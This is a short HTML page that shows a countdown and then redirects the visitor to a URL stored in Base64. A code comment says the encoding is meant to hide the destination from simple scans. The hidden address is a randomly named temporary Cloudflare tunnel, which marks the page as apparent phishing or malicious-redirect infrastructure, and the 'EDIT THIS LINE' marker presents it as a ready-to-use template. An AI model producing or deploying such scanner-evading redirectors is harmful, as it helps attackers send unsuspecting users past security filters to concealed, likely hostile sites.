<!DOCTYPE html> 
<html lang="en"> 
<head> 
<meta charset="UTF-8"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
<title>Redirecting...</title> 
<style> 
body { 
font-family: sans-serif; 
display: flex; 
justify-content: center; 
align-items: center; 
height: 100vh; 
margin: 0; 
background-color: #f0f0f0; 
color: #333; 
} 
#timer { 
font-size: 2em; 
font-weight: bold; 
} 
</style> 
</head> 
<body> 
<div id="timer">Redirecting in <span id="countdown">5</span> seconds...</div> 
<script> 
// --- EDIT THIS LINE --- 
// The URL is encoded in Base64 to hide it from simple scans. 
const encodedUrl = 'aHR0cHM6Ly9zdXJ2ZXlzLWxlc3MtZ2x1Y29zZS1zdWdnZXN0aW9uLnRyeWNsb3VkZmxhcmUuY29t'; 
// --------------------- 
const destinationUrl = atob(encodedUrl); // Decodes the Base64 string back to a normal URL 
const delayInSeconds = 5; 
const countdownElement = document.getElementById('countdown'); 
let secondsLeft = delayInSeconds; 
countdownElement.textContent = secondsLeft; 
const countdownInterval = setInterval(() => { 
secondsLeft--; 
countdownElement.textContent = secondsLeft; 
if (secondsLeft <= 0) { 
clearInterval(countdownInterval); 
window.location.href = destinationUrl; 
} 
}, 1000); 
</script> 
</body> 
</html>
